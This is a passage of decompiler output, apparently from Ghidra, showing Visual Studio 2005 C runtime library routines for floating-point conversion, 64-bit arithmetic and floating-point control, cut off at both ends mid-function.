        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419583;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00419575;
    goto LAB_00419543;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_00419583:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2005 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_0041a463((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_004195e9:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419629;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_0041961b:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419629;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_0041961b;
    goto LAB_004195e9;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_00419629:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = _Digits;
    if (_Digits < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      *_Buf = '0';
      pcVar3 = _Buf + 1;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Buf + 1);
        _memmove(_Buf,_Buf + 1,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2005 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  uint uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar2 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar4 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar3 = uVar2 & 0x7ff;
  uVar1 = *param_2;
  local_8 = 0x80000000;
  if ((uVar2 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar1 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_004197a7;
    }
    uVar3 = uVar3 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar3 == 0x7ff) {
    uVar3 = 0x7fff;
  }
  else {
    uVar3 = uVar3 + 0x3c00;
  }
  param_1[1] = uVar1 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  *param_1 = uVar1 << 0xb;
  while (local_8 == 0) {
    uVar1 = param_1[1];
    uVar3 = uVar3 - 1;
    param_1[1] = uVar1 * 2 | *param_1 >> 0x1f;
    *param_1 = *param_1 * 2;
    local_8 = uVar1 * 2 & 0x80000000;
  }
  uVar4 = uVar4 | uVar3;
LAB_004197a7:
  *(ushort *)(param_1 + 2) = uVar4;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2005 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  int iVar1;
  errno_t eVar2;
  STRFLT p_Var3;
  short local_30;
  char local_2e;
  char local_2c [24];
  uint local_14;
  uint uStack_10;
  ushort uStack_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  ___dtold(&local_14,(uint *)&_Dbl);
  iVar1 = __I10_OUTPUT(local_14,uStack_10,uStack_c,0x11,0,&local_30);
  _Flt->flag = iVar1;
  _Flt->sign = (int)local_2e;
  _Flt->decpt = (int)local_30;
  eVar2 = _strcpy_s(_ResultStr,_SizeInBytes,local_2c);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  _Flt->mantissa = _ResultStr;
  p_Var3 = (STRFLT)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return p_Var3;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2005 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2005 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar3;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422044 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2005 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_00419ede;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_004236f8 - 1;
    iVar6 = (int)(DAT_004236f8 + ((int)DAT_004236f8 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_004236f8 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_00419b12;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_00419b19;
LAB_00419b12:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_00419b19:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_00419b27;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_00419b27:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_004236f4 - DAT_004236f8)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_004236f4 < iVar14) {
        if (iVar14 < DAT_004236f0) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_00423704;
          iVar4 = (int)(DAT_004236fc + ((int)DAT_004236fc >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236fc & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_004236fc + ((int)DAT_004236fc >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236fc & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_00423704 + DAT_004236f0;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_00419ede;
      }
      local_14 = DAT_004236f4 - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_004236f8 - 1;
      iVar14 = (int)(DAT_004236f8 + ((int)DAT_004236f8 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_004236f8 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00419cca;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_00419cca:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_004236fc + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_00419ede:
  uVar13 = iVar14 << (0x1fU - (char)DAT_004236fc & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_00423700 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_00423700 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2005 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_0041a420;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_00423710 - 1;
    iVar6 = (int)(DAT_00423710 + ((int)DAT_00423710 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_00423710 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_0041a054;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_0041a05b;
LAB_0041a054:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_0041a05b:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_0041a069;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_0041a069:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_0042370c - DAT_00423710)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_0042370c < iVar14) {
        if (iVar14 < DAT_00423708) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_0042371c;
          iVar4 = (int)(DAT_00423714 + ((int)DAT_00423714 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00423714 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_00423714 + ((int)DAT_00423714 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00423714 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_0042371c + DAT_00423708;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_0041a420;
      }
      local_14 = DAT_0042370c - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
